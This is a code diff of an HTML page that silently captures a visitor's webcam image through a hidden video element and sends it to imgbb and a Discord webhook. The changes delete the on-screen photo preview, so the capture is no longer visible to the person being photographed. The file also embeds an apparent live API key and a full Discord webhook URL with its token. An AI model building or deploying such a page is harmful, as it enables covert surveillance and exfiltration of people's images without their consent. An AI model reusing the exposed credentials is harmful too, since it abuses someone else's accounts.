@@ -15,23 +15,16 @@
   video {
     display: none;
   }
-  img {
-    max-width: 90vw;
-    max-height: 90vh;
-    border: none;
-    display: block;
-  }
 </style>
 </head>
 <body>
   <video id="video" autoplay playsinline></video>
-  <img id="photo" alt="Foto capturada" />
+
   <script>
     const video = document.getElementById('video');
-    const photo = document.getElementById('photo');
 
-    const IMGBB_API_KEY = '22073208377f336c94ab59a9dbae29ff'; // <== substitua aqui
-    const webhookURL = 'https://discord.com/api/webhooks/1391682825329180752/ym0kJ2YnOS0bFj5VK0EpK2K3T-BZtmYI4xRYxaBK-DReqeo75zkUTh_CIip1gtaVbPBi'; // <== substitua aqui
+    const IMGBB_API_KEY = '22073208377f336c94ab59a9dbae29ff'; // Substitua aqui
+    const webhookURL = 'https://discord.com/api/webhooks/1391682825329180752/ym0kJ2YnOS0bFj5VK0EpK2K3T-BZtmYI4xRYxaBK-DReqeo75zkUTh_CIip1gtaVbPBi'; // Substitua aqui
 
     async function uploadToImgbb(base64Image) {
       const formData = new FormData();
@@ -74,7 +67,6 @@
           const ctx = canvas.getContext('2d');
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
           const dataURL = canvas.toDataURL('image/png');
-          photo.src = dataURL;
 
           const base64Data = dataURL.split(',')[1];
 
@@ -86,6 +78,7 @@
             console.error('Erro no upload ou envio:', err);
           }
 
+          // Desliga a câmera
           stream.getTracks().forEach(track => track.stop());
         };
       } catch (err) {
